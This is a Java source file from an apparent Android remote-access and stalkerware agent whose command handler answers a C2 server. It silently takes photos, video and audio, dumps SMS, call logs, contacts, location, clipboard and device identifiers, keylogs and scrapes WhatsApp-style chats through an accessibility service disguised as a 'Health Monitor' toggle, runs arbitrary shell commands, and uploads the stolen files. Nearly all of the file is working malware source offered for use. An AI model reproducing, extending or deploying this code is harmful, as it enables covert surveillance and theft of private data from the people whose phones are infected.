package com.warden.agent;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.ClipboardManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/** Executes C2 commands. Each returns a JSON/text result string. */
public class CommandHandler {

    private static final String TAG = "warden";

    public static String handle(Context ctx, String cmd, String args) {
        try {
            switch (cmd) {
                case "sms":       return dumpSms(ctx);
                case "calls":     return dumpCalls(ctx);
                case "contacts":  return dumpContacts(ctx);
                case "location":  return getLocation(ctx);
                case "photo":     return takePhoto(ctx, "front".equals(args) ? 1 : 0);
                case "audio":     return recordAudio(ctx, args.isEmpty() ? 10 : Integer.parseInt(args));
                case "files":     return listFiles(args.isEmpty() ? Environment.getExternalStorageDirectory().getAbsolutePath() : args);
                case "download":  return downloadFile(ctx, args);
                case "shell":     return shell(args);
                case "clipboard": return clipboard(ctx);
                case "apps":      return listApps(ctx);
                case "openapp":   return openApp(ctx, args);
                case "videorec":  return recordVideo(ctx, args);
                case "socialscrape": return socialScrape(ctx, args);
                case "keylog":    return setKeylog(args);
                case "info":      return deviceInfo(ctx);
                case "interval":  return setInterval(ctx, args);
                case "toast":     return toast(ctx, args);
                case "opensms":   return openSms(ctx, args);
                default:          return "unknown command: " + cmd;
            }
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    // ---------- data theft ----------

    private static String dumpSms(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/"),
                new String[]{"address", "body", "date", "type"}, null, null, "date DESC LIMIT 200");
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject j = new JSONObject();
                j.put("from", c.getString(0));
                j.put("body", c.getString(1));
                j.put("date", c.getLong(2));
                j.put("type", c.getInt(3) == 1 ? "inbox" : "sent");
                arr.put(j);
            }
            c.close();
        }
        return arr.toString();
    }

    private static String dumpCalls(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE,
                        CallLog.Calls.DURATION}, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject j = new JSONObject();
                j.put("number", c.getString(0));
                int t = c.getInt(1);
                j.put("type", t == 1 ? "incoming" : t == 2 ? "outgoing" : t == 3 ? "missed" : "other");
                j.put("date", c.getLong(2));
                j.put("duration", c.getInt(3));
                arr.put(j);
            }
            c.close();
        }
        return arr.toString();
    }

    private static String dumpContacts(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                JSONObject j = new JSONObject();
                j.put("id", c.getString(0));
                j.put("name", c.getString(1));
                Cursor p = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                        new String[]{c.getString(0)}, null);
                JSONArray phones = new JSONArray();
                if (p != null) {
                    while (p.moveToNext()) phones.put(p.getString(0));
                    p.close();
                }
                j.put("phones", phones);
                arr.put(j);
            }
            c.close();
        }
        return arr.toString();
    }

    private static String getLocation(Context ctx) throws Exception {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        Location best = null;
        for (String prov : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
            try {
                Location l = lm.getLastKnownLocation(prov);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            } catch (SecurityException ignored) {}
        }
        if (best == null) {
            // wait briefly for a fresh fix
            final CountDownLatch latch = new CountDownLatch(1);
            final Location[] fresh = new Location[1];
            try {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0,
                        new android.location.LocationListener() {
                            @Override public void onLocationChanged(Location l) {
                                fresh[0] = l; latch.countDown();
                            }
                            @Override public void onStatusChanged(String p, int s, android.os.Bundle e) {}
                            @Override public void onProviderEnabled(String p) {}
                            @Override public void onProviderDisabled(String p) {}
                        }, null);
                latch.await(15, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
            best = fresh[0];
        }
        if (best == null) return "no location fix";
        JSONObject j = new JSONObject();
        j.put("lat", best.getLatitude());
        j.put("lon", best.getLongitude());
        j.put("accuracy", best.getAccuracy());
        j.put("time", best.getTime());
        j.put("provider", best.getProvider());
        return j.toString();
    }

    // ---------- surveillance ----------

    /** Silent photo via Camera1 with dummy SurfaceTexture preview. */
    private static String takePhoto(Context ctx, int facing) throws Exception {
        Camera cam = null;
        try {
            cam = Camera.open(facing);
        } catch (Exception e) {
            cam = Camera.open();
        }
        if (cam == null) return "camera unavailable";
        Camera camera = cam;
        SurfaceTexture st = new SurfaceTexture(0);
        camera.setPreviewTexture(st);
        camera.startPreview();
        Thread.sleep(800);
        final CountDownLatch latch = new CountDownLatch(1);
        final String[] result = new String[1];
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override public void onPictureTaken(byte[] data, Camera c) {
                try {
                    File out = new File(ctx.getCacheDir(),
                            "p" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(out);
                    fos.write(data);
                    fos.close();
                    result[0] = out.getAbsolutePath();
                    new C2Client(ctx, new Prefs(ctx)).uploadFile(out.getAbsolutePath());
                } catch (Exception e) {
                    result[0] = "save failed: " + e.getMessage();
                } finally {
                    latch.countDown();
                }
            }
        });
        latch.await(20, TimeUnit.SECONDS);
        try { camera.stopPreview(); camera.release(); } catch (Exception ignored) {}
        return result[0] != null ? result[0] : "capture timeout";
    }

    private static String recordAudio(Context ctx, int seconds) throws Exception {
        if (seconds > 300) seconds = 300;
        File out = new File(ctx.getCacheDir(), "a" + System.currentTimeMillis() + ".3gp");
        MediaRecorder mr = new MediaRecorder();
        mr.setAudioSource(MediaRecorder.AudioSource.MIC);
        mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mr.setOutputFile(out.getAbsolutePath());
        mr.prepare();
        mr.start();
        Thread.sleep(seconds * 1000L);
        mr.stop();
        mr.release();
        new C2Client(ctx, new Prefs(ctx)).uploadFile(out.getAbsolutePath());
        return out.getAbsolutePath();
    }

    // ---------- file ops ----------

    private static String listFiles(String path) throws Exception {
        File dir = new File(path);
        if (!dir.exists()) return "no such path";
        JSONArray arr = new JSONArray();
        File[] fs = dir.listFiles();
        if (fs != null) {
            for (File f : fs) {
                JSONObject j = new JSONObject();
                j.put("name", f.getName());
                j.put("dir", f.isDirectory());
                j.put("size", f.length());
                j.put("path", f.getAbsolutePath());
                arr.put(j);
            }
        }
        return arr.toString();
    }

    private static String downloadFile(Context ctx, String path) throws Exception {
        new C2Client(ctx, new Prefs(ctx)).uploadFile(path);
        return "uploaded: " + path;
    }

    // ---------- device control ----------

    private static String openApp(Context ctx, String pkg) {
        if (pkg.isEmpty()) return "usage: openapp <package>";
        PackageManager pm = ctx.getPackageManager();
        Intent i = pm.getLaunchIntentForPackage(pkg.trim());
        if (i == null) return "app not installed: " + pkg;
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return "opened: " + pkg;
    }

    /** Silent video recording via Camera1 + MediaRecorder. args: "front|30" or "back|15" */
    private static String recordVideo(Context ctx, String args) throws Exception {
        String[] parts = args.split("\\|");
        int facing = parts.length > 0 && parts[0].equals("front") ? 1 : 0;
        int seconds = parts.length > 1 ? Integer.parseInt(parts[1].trim()) : 15;
        if (seconds > 300) seconds = 300;

        Camera cam = Camera.open(facing);
        MediaRecorder mr = new MediaRecorder();
        cam.unlock();
        mr.setCamera(cam);
        mr.setAudioSource(MediaRecorder.AudioSource.MIC);
        mr.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mr.setVideoEncodingBitRate(3_000_000);
        mr.setVideoFrameRate(30);
        File out = new File(ctx.getCacheDir(), "v" + System.currentTimeMillis() + ".mp4");
        mr.setOutputFile(out.getAbsolutePath());
        mr.setPreviewDisplay(new android.view.Surface(new android.graphics.SurfaceTexture(0)));
        mr.prepare();
        mr.start();
        Thread.sleep(seconds * 1000L);
        try { mr.stop(); } catch (Exception ignored) {}
        mr.release();
        try { cam.lock(); } catch (Exception ignored) {}
        cam.release();
        new C2Client(ctx, new Prefs(ctx)).uploadFile(out.getAbsolutePath());
        return out.getAbsolutePath();
    }

    /**
     * Active social-app scraping (no root needed):
     * open the app, wait for it to render, walk the accessibility node tree,
     * scroll and repeat. Captures chat names, messages, input fields —
     * everything visible on screen.
     * args: "com.whatsapp|3" (package|scroll pages, default 2)
     */
    private static String socialScrape(Context ctx, String args) {
        if (!AccessibilityLogger.isEnabled()) {
            return "error: accessibility service not enabled. "
                    + "Enable it in Settings > Accessibility (or ask target to tap the "
                    + "'Health Monitor' toggle).";
        }
        String[] parts = args.split("\\|");
        if (parts.length == 0 || parts[0].trim().isEmpty()) {
            return "usage: socialscrape <package> [scrolls]";
        }
        String pkg = parts[0].trim();
        int scrolls = 2;
        if (parts.length > 1) {
            try { scrolls = Integer.parseInt(parts[1].trim()); } catch (Exception ignored) {}
        }
        if (scrolls > 20) scrolls = 20;

        openApp(ctx, pkg);
        try { Thread.sleep(4500); } catch (InterruptedException ignored) {}
        return AccessibilityLogger.scrapeActive(pkg, scrolls);
    }

    /**
     * Targeted keylog: capture every text event from one package, no throttle.
     * args: "com.whatsapp|60" (package|seconds, max 600)
     */
    private static String setKeylog(String args) {
        String[] parts = args.split("\\|");
        if (parts.length < 2) {
            AccessibilityLogger.keylogTarget = null;
            AccessibilityLogger.keylogUntil = 0;
            return "keylog off";
        }
        String pkg = parts[0].trim();
        int sec = 60;
        try { sec = Integer.parseInt(parts[1].trim()); } catch (Exception ignored) {}
        if (sec > 600) sec = 600;
        AccessibilityLogger.keylogTarget = pkg;
        AccessibilityLogger.keylogUntil = System.currentTimeMillis() + sec * 1000L;
        return "keylog armed on " + pkg + " for " + sec + "s";
    }

    private static String shell(String cmd) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader re = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) sb.append(line).append("\n");
        while ((line = re.readLine()) != null) sb.append("[err] ").append(line).append("\n");
        p.waitFor();
        return sb.length() > 0 ? sb.toString() : "(no output)";
    }

    private static String clipboard(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            CharSequence t = cm.getText();
            return t != null ? t.toString() : "(empty)";
        } catch (Exception e) { return "clipboard error: " + e.getMessage(); }
    }

    private static String listApps(Context ctx) throws Exception {
        JSONArray arr = new JSONArray();
        List<PackageInfo> ps = ctx.getPackageManager().getInstalledPackages(0);
        for (PackageInfo p : ps) {
            JSONObject j = new JSONObject();
            j.put("pkg", p.packageName);
            j.put("name", p.applicationInfo.loadLabel(ctx.getPackageManager()).toString());
            j.put("system", (p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
            arr.put(j);
        }
        return arr.toString();
    }

    private static String deviceInfo(Context ctx) throws Exception {
        JSONObject j = new JSONObject();
        j.put("model", Build.MODEL);
        j.put("brand", Build.BRAND);
        j.put("device", Build.DEVICE);
        j.put("android", Build.VERSION.RELEASE);
        j.put("sdk", Build.VERSION.SDK_INT);
        j.put("rooted", checkRoot());
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            j.put("imei", tm.getDeviceId());
            j.put("phone", tm.getLine1Number());
            j.put("carrier", tm.getNetworkOperatorName());
        } catch (Exception ignored) {}
        return j.toString();
    }

    private static boolean checkRoot() {
        for (String p : new String[]{"/system/bin/su", "/system/xbin/su", "/sbin/su",
                "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su"}) {
            if (new File(p).exists()) return true;
        }
        return false;
    }

    private static String setInterval(Context ctx, String args) {
        int sec = Integer.parseInt(args.trim());
        new Prefs(ctx).interval(sec);
        return "interval set to " + sec + "s";
    }

    private static String toast(Context ctx, String msg) {
        android.os.Handler h = new android.os.Handler(ctx.getMainLooper());
        h.post(new Runnable() {
            @Override public void run() {
                android.widget.Toast.makeText(ctx, msg, android.widget.Toast.LENGTH_LONG).show();
            }
        });
        return "toast shown";
    }

    private static String openSms(Context ctx, String args) {
        // args: "number|body"
        String[] parts = args.split("\\|", 2);
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setData(Uri.parse("smsto:" + parts[0]));
        if (parts.length > 1) i.putExtra("sms_body", parts[1]);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        return "sms composer opened";
    }
}
